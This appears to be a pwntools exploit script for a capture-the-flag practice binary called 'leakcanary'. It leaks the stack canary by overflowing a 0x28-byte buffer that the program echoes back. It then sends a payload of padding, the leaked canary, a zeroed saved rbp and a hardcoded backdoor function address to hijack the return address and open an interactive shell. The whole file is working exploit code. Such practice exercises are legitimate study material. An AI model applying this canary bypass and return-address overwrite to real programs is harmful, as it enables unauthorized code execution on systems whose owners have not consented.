from pwn import *

context.log_level = 'debug'

pwn_dir = "/home/kali/Desktop/PWN/stack"
elf_prog = "leakcanary/leakcanary"

back_door_func = 0x00401166
vul_func = 0x00401180

elf_ana = "{}/{}".format(pwn_dir, elf_prog)

elf = ELF(elf_ana)

system_sym = elf.symbols['system']
system_plt = elf.plt['system']
system_got = elf.got['system']

print("system_sym=>", hex(system_sym))
print("system_plt=>", hex(system_plt))
print("system_got=>", hex(system_got))

sh_proc = process([elf_ana])
sh_proc.sendline(b'a'*0x28)
data = sh_proc.recvuntil(b'Hello ' + b'a'*0x28)

canary_val = u64(sh_proc.recv(8))-0xa

print("canary=>", hex(canary_val))

#               canary        rbp      ret_address
pd = b'a'*0x28 + p64(canary_val) + p64(0) + p64(back_door_func)
sh_proc.send(pd)
sh_proc.interactive()
